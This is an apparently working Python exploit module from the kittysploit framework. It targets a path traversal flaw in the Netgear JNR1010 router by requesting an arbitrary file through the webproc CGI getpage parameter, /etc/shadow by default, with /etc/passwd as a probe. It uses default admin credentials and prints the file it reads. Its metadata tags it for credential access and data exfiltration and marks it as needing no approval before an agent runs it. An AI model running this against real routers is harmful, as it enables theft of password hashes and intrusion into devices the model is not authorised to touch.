#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Netgear JNR1010 Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Netgear JNR1010 Path Traversal',
        'description': 'Module exploits Netgear JNR1010 Path Traversal vulnerability which allows to read any file on the system.',
        'author': ['Todor Donev', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['https://www.exploit-db.com/exploits/40736/'],
        'tags': ['iot', 'router', 'lfi', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    username = OptString("admin", "Username to log in")
    password = OptString("password", "Password to log in")
    filename = OptString("/etc/shadow", "File to read")

    def run(self):
        if self.check():
            path = "/cgi-bin/webproc?getpage={}&var:language=en_us&var:language=en_us" \
                   "&var:menu=advanced&var:page=basic_home".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path,
                auth=(self.username, self.password)
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")
    def check(self):
        path = "/cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:language=en_us" \
               "&var:menu=advanced&var:page=basic_home"

        response = self.http_request(
            method="GET",
            path=path,
            auth=(self.username, self.password),
        )
        if response is None:
            return False  # target is not vulnerable

        if ("/etc/passwd" in (response.text or '')):
            return True  # target vulnerable

        return False  # target is not vulnerable
